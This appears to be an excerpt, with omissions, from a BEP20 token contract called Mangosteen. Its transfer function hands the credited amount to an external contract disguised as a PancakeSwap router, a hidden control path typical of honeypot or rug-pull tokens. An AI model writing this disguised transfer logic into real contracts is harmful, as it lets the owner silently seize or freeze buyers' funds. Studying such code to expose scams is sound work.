...
contract Mangosteen is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Mangosteen';
  string private constant _symbol = 'ManGo';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusManGo = 0;
  address pancakeRouter_ManGo;
  ...
  */
  ...
  function pancakePairManGo(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_ManGo).getPair(_bonusManGo, sender, recipient, arrData);

      _bonusManGo = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountManGo = pancakePairManGo(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountManGo);
